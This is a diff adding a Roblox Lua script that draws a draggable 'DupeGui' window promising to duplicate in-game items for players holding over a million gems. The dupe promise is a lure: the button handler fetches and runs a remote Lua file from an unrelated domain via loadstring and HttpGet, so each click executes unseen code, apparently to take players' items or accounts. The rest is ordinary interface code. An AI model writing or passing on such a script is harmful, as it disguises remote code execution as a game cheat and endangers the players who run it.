@@ -1,0 +1,105 @@
+-- Create a ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "DupeGui"
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create the Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 200)
+frame.Position = UDim2.new(0.5, -150, 0.5, -100)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true -- Makes the GUI draggable for PC users
+frame.Parent = screenGui
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Text = "Read Description To Learn How To Dupe"
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 20
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Size = UDim2.new(1, 0, 0, 50)
+title.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+title.BorderSizePixel = 0
+title.Parent = frame
+
+-- Description
+local description = Instance.new("TextLabel")
+description.Text = "In order to dupe, you must have 1M+ gems.\nBecause Roblox will get mad 😂."
+description.Font = Enum.Font.SourceSans
+description.TextSize = 16
+description.TextColor3 = Color3.fromRGB(200, 200, 200)
+description.Size = UDim2.new(1, -20, 0, 100)
+description.Position = UDim2.new(0, 10, 0, 60)
+description.TextWrapped = true
+description.BackgroundTransparency = 1
+description.Parent = frame
+
+-- Main Button
+local button = Instance.new("TextButton")
+button.Text = "Spam Click Me To Dupe Press fast around 13 times"
+button.Font = Enum.Font.SourceSansBold
+button.TextSize = 18
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.Size = UDim2.new(0.8, 0, 0, 40)
+button.Position = UDim2.new(0.1, 0, 0, 160)
+button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+button.BorderSizePixel = 0
+button.Parent = frame
+
+-- Button Script
+button.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://egorikusa.space/9f62623e7bd17ea1c4b6496b.lua", true))()
+end)
+
+-- Close Button
+local closeButton = Instance.new("TextButton")
+closeButton.Text = "X"
+closeButton.Font = Enum.Font.SourceSansBold
+closeButton.TextSize = 18
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.Size = UDim2.new(0, 30, 0, 30)
+closeButton.Position = UDim2.new(1, -35, 0, 5)
+closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+closeButton.BorderSizePixel = 0
+closeButton.Parent = frame
+
+-- Close Script
+closeButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy() -- Removes the GUI
+end)
+
+-- Make Draggable for Mobile Users
+local dragging = false
+local dragInput, dragStart, startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if dragging and input == dragInput then
+        update(input)
+    end
+end)
